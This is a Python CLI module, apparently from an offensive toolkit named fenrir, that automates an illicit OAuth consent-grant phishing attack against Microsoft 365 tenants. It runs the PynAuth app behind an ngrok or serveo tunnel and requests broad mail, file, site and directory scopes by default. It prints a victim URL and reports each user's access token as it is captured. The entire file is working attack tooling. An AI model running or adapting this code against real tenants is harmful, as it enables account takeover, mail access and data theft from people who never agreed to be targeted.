from __future__ import annotations

import json
import logging
import os
import re
import subprocess
import sys
import tempfile
import time
import urllib.request
from pathlib import Path

import typer
from rich.console import Console

log = logging.getLogger(__name__)
console = Console(stderr=True)

PYNAUTH_DIR = Path(__file__).resolve().parent.parent.parent.parent / "tools" / "pynauth"

WRAPPER_TEMPLATE = '''"""PynAuth runner — injected by fenrir consent."""
import json
import os
import sys
import types

cfg_path = os.environ["FENRIR_PYNAUTH_CFG"]
PYNAUTH_DIR = os.environ["FENRIR_PYNAUTH_DIR"]

with open(cfg_path) as f:
    CFG = json.load(f)

mod = sys.modules.get("app_config")
if mod is None:
    mod = types.ModuleType("app_config")
    mod.__file__ = os.path.join(PYNAUTH_DIR, "app_config.py")
    sys.modules["app_config"] = mod

for _key, _val in CFG.items():
    setattr(mod, _key, _val)

sys.path.insert(0, PYNAUTH_DIR)
os.chdir(PYNAUTH_DIR)

import app as pynauth_app

app = pynauth_app.app
if __name__ == "__main__":
    port = int(os.environ.get("FENRIR_PYNAUTH_PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
'''


def _find_ngrok() -> str | None:
    for p in os.environ.get("PATH", "").split(os.pathsep):
        candidate = Path(p) / "ngrok"
        if candidate.exists():
            return str(candidate)
    return None


def _start_ngrok(port: int) -> str | None:
    ngrok = _find_ngrok()
    if not ngrok:
        return None
    subprocess.Popen([ngrok, "http", str(port), "--log=stdout"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(15):
        time.sleep(1)
        try:
            req = urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels")
            data = json.loads(req.read())
            for t in data.get("tunnels", []):
                if t.get("proto") == "https":
                    return t["public_url"]
        except Exception:
            pass
    return None


def _start_serveo(port: int) -> str | None:
    serveo_log = Path("/tmp/fenrir_serveo.log")
    with open(serveo_log, "w") as f:
        proc = subprocess.Popen(
            ["ssh", "-o", "StrictHostKeyChecking=no", "-R", f"80:localhost:{port}", "serveo.net"],
            stdout=f, stderr=subprocess.STDOUT,
        )
    for _ in range(10):
        time.sleep(2)
        if serveo_log.exists():
            text = serveo_log.read_text()
            m = re.search(r"https://\S+\.serveousercontent\.com", text)
            if m:
                return m.group(0)
    proc.kill()
    return None


CONSENT_APP = typer.Typer(
    name="consent",
    help="Launch Illicit Consent Grant attack (starts PynAuth behind a tunnel).",
    no_args_is_help=True,
)


@CONSENT_APP.callback(invoke_without_command=True)
def consent(
    ctx: typer.Context,
    client_id: str = typer.Option(
        ..., "--client-id", help="Azure app client ID",
        envvar="FENRIR_CLIENT_ID", prompt=True,
    ),
    client_secret: str = typer.Option(
        ..., "--client-secret", help="Azure app client secret",
        envvar="FENRIR_CLIENT_SECRET", prompt=True, hide_input=True,
    ),
    tenant: str = typer.Option(
        "common", "--tenant", "-t", help="Tenant ID or 'common' for multi-tenant",
        envvar="FENRIR_TENANT",
    ),
    scopes: str = typer.Option(
        "User.Read User.Read.All Mail.Read Mail.ReadWrite Mail.Send "
        "Files.ReadWrite.All Sites.ReadWrite.All Directory.Read.All",
        "--scopes", "-s", help="Space-separated OAuth scopes",
    ),
    port: int = typer.Option(
        5000, "--port", "-p", help="Local port for the Flask app",
    ),
    tunnel: str = typer.Option(
        "ngrok", "--tunnel", help="Tunneling service: ngrok (default) or serveo",
    ),
    register_app: bool = typer.Option(
        False, "--register-app", help="Attempt to auto-register the app in Azure via Graph API",
    ),
):
    scope_list = scopes.split()

    if not PYNAUTH_DIR.exists():
        console.print(f"[red]PynAuth not found at {PYNAUTH_DIR}[/red]")
        console.print("Clone it: git clone https://github.com/Synzack/PynAuth.git")
        raise typer.Exit(code=1)

    console.print(f"[cyan]▶ Starting tunnel ({tunnel})...[/cyan]")
    tunnel_url = None
    if tunnel == "ngrok":
        tunnel_url = _start_ngrok(port)
        if not tunnel_url:
            console.print("[yellow]ngrok failed/timed out, trying serveo...[/yellow]")
            tunnel_url = _start_serveo(port)
    elif tunnel == "serveo":
        tunnel_url = _start_serveo(port)
    else:
        console.print(f"[red]Unknown tunnel: {tunnel} (use ngrok or serveo)[/red]")
        raise typer.Exit(code=2)

    if tunnel_url:
        console.print(f"[green]✓ Tunnel URL:[/green] {tunnel_url}")
    else:
        console.print("[yellow]No tunnel URL obtained. Starting locally only.[/yellow]")

    redirect_path = "/getAToken"

    config = {
        "CLIENT_SECRET": client_secret,
        "AUTHORITY": f"https://login.microsoftonline.com/{tenant}",
        "CLIENT_ID": client_id,
        "REDIRECT_PATH": redirect_path,
        "ENDPOINT": "https://graph.microsoft.com/v1.0/users",
        "SCOPE": scope_list,
        "SESSION_TYPE": "filesystem",
    }

    cfg_dir = Path(tempfile.mkdtemp(prefix="fenrir_consent_"))
    cfg_file = cfg_dir / "pynauth_cfg.json"
    cfg_file.write_text(json.dumps(config))

    wrapper_file = cfg_dir / "run_pynauth.py"
    wrapper_file.write_text(WRAPPER_TEMPLATE)

    console.print(f"[cyan]▶ Starting PynAuth on port {port}...[/cyan]")
    env = os.environ.copy()
    env["FENRIR_PYNAUTH_CFG"] = str(cfg_file)
    env["FENRIR_PYNAUTH_DIR"] = str(PYNAUTH_DIR)
    env["FENRIR_PYNAUTH_PORT"] = str(port)
    proc = subprocess.Popen(
        [sys.executable, str(wrapper_file)],
        cwd=str(PYNAUTH_DIR),
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )

    time.sleep(3)
    if proc.poll() is not None:
        out, _ = proc.communicate()
        console.print(f"[red]PynAuth exited immediately:[/red] {out.decode()}")
        raise typer.Exit(code=3)

    redirect_uri = f"{tunnel_url}{redirect_path}" if tunnel_url else f"http://localhost:{port}{redirect_path}"

    console.print()
    console.print("=" * 60)
    console.print("  [bold yellow]Illicit Consent Grant — Ready[/bold yellow]")
    console.print()
    console.print(f"  [bold]Victim URL:[/bold]       {tunnel_url or f'http://localhost:{port}'}")
    console.print(f"  [bold]Redirect URI:[/bold]     {redirect_uri}")
    console.print(f"  [bold]Scopes:[/bold]           {' '.join(scope_list)}")
    console.print()
    console.print("  [dim]Register this redirect URI in your Azure app:[/dim]")
    console.print(f"  [bold]{redirect_uri}[/bold]")
    console.print()
    console.print("  [dim]Waiting for tokens... (Ctrl+C to stop)[/dim]")
    console.print("=" * 60)
    console.print()

    token_file = PYNAUTH_DIR / "tokenLibrary.pickle"
    captured = set()

    try:
        while True:
            if token_file.exists():
                try:
                    import pickle
                    with open(token_file, "rb") as f:
                        lib = pickle.load(f)
                    for user in lib:
                        if user not in captured:
                            captured.add(user)
                            tok = lib[user]
                            expires = tok.get("expires_in", "?")
                            console.print(
                                f"  [green]✓ Token captured![/green] "
                                f"[bold]{user}[/bold] "
                                f"(expires in {expires}s)"
                            )
                except Exception:
                    pass
            time.sleep(2)
    except KeyboardInterrupt:
        console.print("\n[yellow]Shutting down...[/yellow]")
        proc.terminate()
        proc.wait()
        console.print("[green]Done.[/green]")
